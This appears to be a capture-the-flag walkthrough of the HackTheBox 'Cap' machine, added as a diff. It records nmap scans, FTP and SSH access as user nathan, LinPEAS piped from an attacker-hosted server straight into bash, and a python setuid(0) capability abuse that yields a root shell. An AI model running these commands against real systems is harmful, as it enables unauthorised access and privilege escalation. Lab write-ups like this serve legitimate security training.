@@ -1,0 +1,146 @@
+#Nmap
+
+[ initial scan ]
+
+└─$ nmap -p- 10.10.10.245 --min-rate=1000
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-01 07:31 EDT
+Nmap scan report for 10.10.10.245
+Host is up (0.28s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+Nmap done: 1 IP address (1 host up) scanned in 78.72 seconds
+________________________________________________________________________________________________________________________
+
+[ script enumeration ]
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-01 07:35 EDT
+Nmap scan report for 10.10.10.245
+Host is up (0.32s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
+|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
+|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
+80/tcp open  http    Gunicorn
+|_http-server-header: gunicorn
+|_http-title: Security Dashboard
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 2 hops
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+TRACEROUTE (using port 21/tcp)
+HOP RTT       ADDRESS
+1   379.27 ms 10.10.14.1
+2   386.11 ms 10.10.10.245
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 23.54 seconds
+________________________________________________________________________________________________________________________
+
+#FTP
+
+──(kali㉿kali)-[~/HackTheBox/cap]
+└─$ ftp 10.10.10.245
+Connected to 10.10.10.245.
+220 (vsFTPd 3.0.3)
+Name (10.10.10.245:kali): nathan
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||54253|)
+150 Here comes the directory listing.
+-rw-rw-r--    1 1001     1001            0 Sep 01 10:20 exploit.c
+drwxr-xr-x    3 1001     1001         4096 Sep 01 06:31 snap
+-r--------    1 1001     1001           33 Sep 01 04:02 user.txt
+226 Directory send OK.
+ftp> get user.txt
+local: user.txt remote: user.txt
+229 Entering Extended Passive Mode (|||60531|)
+150 Opening BINARY mode data connection for user.txt (33 bytes).
+100% |*******************************************************************************************************************************************************|    33      255.76 KiB/s    00:00 ETA
+226 Transfer complete.
+33 bytes received in 00:00 (0.11 KiB/s)
+50 Here comes the directory listing.
+-rw-rw-r--    1 1001     1001            0 Sep 01 10:20 exploit.c
+drwxr-xr-x    3 1001     1001         4096 Sep 01 06:31 snap
+-r--------    1 1001     1001           33 Sep 01 04:02 user.txt
+226 Directory send OK.
+ftp> get exploit.c
+local: exploit.c remote: exploit.c
+229 Entering Extended Passive Mode (|||17328|)
+150 Opening BINARY mode data connection for exploit.c (0 bytes).
+     0        0.00 KiB/s
+226 Transfer complete.
+ftp> exit
+221 Goodbye.
+________________________________________________________________________________________________________________________
+
+# SSH
+
+┌──(kali㉿kali)-[~/HackTheBox/cap]
+└─$ ssh nathan@10.10.10.245
+The authenticity of host '10.10.10.245 (10.10.10.245)' can't be established.
+ED25519 key fingerprint is SHA256:UDhIJpylePItP3qjtVVU+GnSyAZSr+mZKHzRoKcmLUI.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.245' (ED25519) to the list of known hosts.
+nathan@10.10.10.245's password:
+Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
+
+Last login: Mon Sep  1 10:35:41 2025 from 
+nathan@cap:~$ ls
+exploit.c  snap  user.txt
+nathan@cap:~$
+
+nathan@cap:~$ id
+uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
+nathan@cap:~$
+________________________________________________________________________________________________________________________
+
+# LinPEAS
+"LinPEAS is a script that search for possible paths to escalate privileges on Linux/Unix*/MacOS hosts. The checks are explained on book.hacktricks.wiki"
+
+INSTALLING...
+└─$ wget  https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
+
+# Using linPEAS for vuln scanning
+//Extracting files from the attacker server using python
+nathan@cap:~$ curl http://<ip>/linpeas.sh | bash
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+  4  933k    4 40500    0     0  30681      0  0:00:31  0:00:01  0:00:30 30658
+
+[ Hit on python server ]
+python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.245 - - [02/Sep/2025 10:20:39] "GET /linpeas.sh HTTP/1.1" 200 -
+________________________________________________________________________________________________________________________
+
+[ Privilege Escalation ]
+nathan@cap:/tmp$ /usr/bin/python3.8
+Python 3.8.5 (default, Jan 27 2021, 15:41:15) 
+[GCC 9.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import os
+>>> os.setuid(0)
+>>> os.system("/bin/bash")
+root@cap:/tmp# id
+uid=0(root) gid=1001(nathan) groups=1001(nathan)
+root@cap:/tmp#
+
+    *** Congratulations you hacked Cap ***
+
+    
